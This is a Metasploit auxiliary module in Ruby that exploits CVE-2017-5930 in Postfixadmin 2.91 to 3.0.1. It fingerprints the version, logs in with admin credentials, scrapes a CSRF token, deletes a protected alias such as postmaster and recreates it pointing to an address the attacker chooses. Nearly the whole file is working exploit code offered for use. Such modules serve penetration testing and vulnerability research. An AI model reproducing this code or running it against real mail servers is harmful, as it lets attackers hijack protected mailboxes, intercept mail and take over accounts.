##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'Postfixadmin Protected Alias Deletion Vulnerability',
      'Description'     => %q{
        Postfixadmin installations between 2.91 and 3.0.1 do not check if an
        admin is allowed to delete protected aliases. This vulnerability can be
        used to redirect protected aliases to an other mail address. Eg. rewrite
        the postmaster@domain alias
      },
      'Author'          => [ 'Jan-Frederik Rieckers' ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          ['CVE', '2017-5930'],
          ['URL', 'https://github.com/postfixadmin/postfixadmin/pull/23'],
          ['BID', '96142'],
        ],
      'Privileged'      => true,
      'Platform'        => ['php'],
      'Arch'            => ARCH_PHP,
      'DisclosureDate'  => 'Feb 03 2017',
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to the postfixadmin installation', '/']),
        OptString.new('USERNAME', [true, 'The Postfixadmin username to authenticate with']),
        OptString.new('PASSWORD', [true, 'The Postfixadmin password to authenticate with']),
        OptString.new('TARGET_ALIAS', [true, 'The alias which should be rewritten']),
        OptString.new('NEW_GOTO', [true, 'The new redirection target of the alias'])
      ])
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def target_alias
    datastore['TARGET_ALIAS']
  end

  def new_goto
    datastore['NEW_GOTO']
  end

  def check
    res = send_request_cgi({'uri' => postfixadmin_url_login, 'method' => 'GET'})

    return Exploit::CheckCode::Unknown unless res

    return Exploit::CheckCode::Safe if res.code != 200

    if res.body =~ /<div id="footer".*Postfix Admin/m
      version = res.body.match(/<div id="footer"[^<]*<a[^<]*Postfix\s*Admin\s*([^<]*)<\//mi)
      return Exploit::CheckCode::Detected unless version
      if Gem::Version.new("2.91") > Gem::Version.new(version[1])
        return Exploit::CheckCode::Detected
      elsif Gem::Version.new("3.0.1") < Gem::Version.new(version[1])
        return Exploit::CheckCode::Detected
      end
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Unknown
  end


  def run
    print_status("Authenticating with Postfixadmin using #{username}:#{password} ...")
    cookie = postfixadmin_login(username, password)
    fail_with(Failure::NoAccess, 'Failed to authenticate with PostfixAdmin') if cookie.nil?
    print_good('Authenticated with Postfixadmin')

    vprint_status('Requesting virtual_list')
    res = send_request_cgi({'uri' => postfixadmin_url_list(target_alias.split("@")[-1]), 'method' => 'GET', 'cookie' => cookie }, 10)
    fail_with(Failure::UnexpectedReply, 'The request for the domain list failed') if res.nil?
    fail_with(Failure::NoAccess, 'Doesn\'t seem to be admin for the domain the target alias is in') if res.redirect?
    body = res.body
    vprint_status('Get token')
    token = body.match(/token=([0-9a-f]{32})/)
    fail_with(Failure::UnexpectedReply, 'Could not get any CSRF-token. You should have at least one other alias or mailbox to get a token') unless token

    t = token[1]

    print_status('Delete the old alias')
    res = send_request_cgi({'uri' => postfixadmin_url_alias_delete(target_alias, t), 'method' => 'GET', 'cookie' => cookie }, 10)

    fail_with(Failure::UnexpectedReply, 'Didn\'t get redirected.') unless res && res.redirect?

    res = send_request_cgi({'uri' => postfixadmin_url_list, 'method' => 'GET', 'cookie' => cookie }, 10)

    if res.nil? || res.body.nil? || res.body !~ /<ul class="flash-info">.*<li.*#{target_alias}.*<\/li>.*<\/ul>/mi
      if res.nil? || res.body.nil?
        fail_with(Failure::UnexpectedReply, 'Unexpected reply while deleting the alias')
      else
        if res.body =~ /<ul class="flash-error">.*<li.*#{target_alias}.*<\/li>.*<\/ul>/mi
          fail_with(Failure::NotVulnerable, 'It seems the target is not vulerable, the deletion of the target alias failed.')
        else
          fail_with(Failure::Unknown, 'An unexpected failure occured.')
        end
      end
    end
    print_good('Deleted the old alias')

    vprint_status('Will create the new alias')
    post_vars = {'submit' => 'Add alias', 'table' => 'alias', 'value[active]' => 1, 'value[domain]' => target_alias.split("@")[-1], 'value[localpart]' => target_alias.split("@")[0..-2].join("@"), 'value[goto]' => new_goto}

    res = send_request_cgi({'uri' => postfixadmin_url_edit, 'method' => 'POST', 'cookie' => cookie, 'vars_post' => post_vars }, 10)

    fail_with(Failure::UnexpectedReply, 'Didn\'t get redirected.') unless res && res.redirect?

    res = send_request_cgi({'uri' => postfixadmin_url_list, 'method' => 'GET', 'cookie' => cookie }, 10)

    if res.nil? || res.body.nil? || res.body !~ /<ul class="flash-info">.*<li.*#{target_alias}.*<\/li>.*<\/ul>/mi
      if res.nil? || res.body.nil?
        fail_with(Failure::UnexpectedReply, 'Unexpected reply while adding new alias')
      else
        if res.body =~ /<ul class="flash-error">/mi
          fail_with(Failure::UnexpectedReply, 'It seems the new alias couldn\'t be added.')
        else
          fail_with(Failure::Unknown, 'An unexpected failure occured.')
        end
      end
    end
    print_good('New alias created')

  end


  # Performs a Postfixadmin login
  #
  # @param user [String] Username
  # @param pass [String] Password
  # @param timeout [Integer] Max seconds to wait before timeout, defaults to 20
  #
  # @return [String, nil] The session cookie as single string if login was successful, nil otherwise
  def postfixadmin_login(user, pass, timeout = 20)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => postfixadmin_url_login,
      'vars_post' => {'fUsername' => user.to_s, 'fPassword' => pass.to_s, 'lang' => 'en', 'Submit' => 'Login'}
    }, timeout)
    if res && res.redirect?
      cookies = res.get_cookies
      return cookies if
        cookies =~ /PHPSESSID=/
    end

    nil
  end

  def postfixadmin_url_login
    normalize_uri(target_uri.path, 'login.php')
  end

  def postfixadmin_url_list(domain=nil)
    modifier = domain.nil? ? "" : "?domain=#{domain}"
    normalize_uri(target_uri.path, 'list-virtual.php' + modifier)
  end

  def postfixadmin_url_alias_delete(target, token)
    normalize_uri(target_uri.path, 'delete.php' + "?table=alias&delete=#{CGI.escape(target)}&token=#{token}")
  end

  def postfixadmin_url_edit
    normalize_uri(target_uri.path, 'edit.php')
  end
end
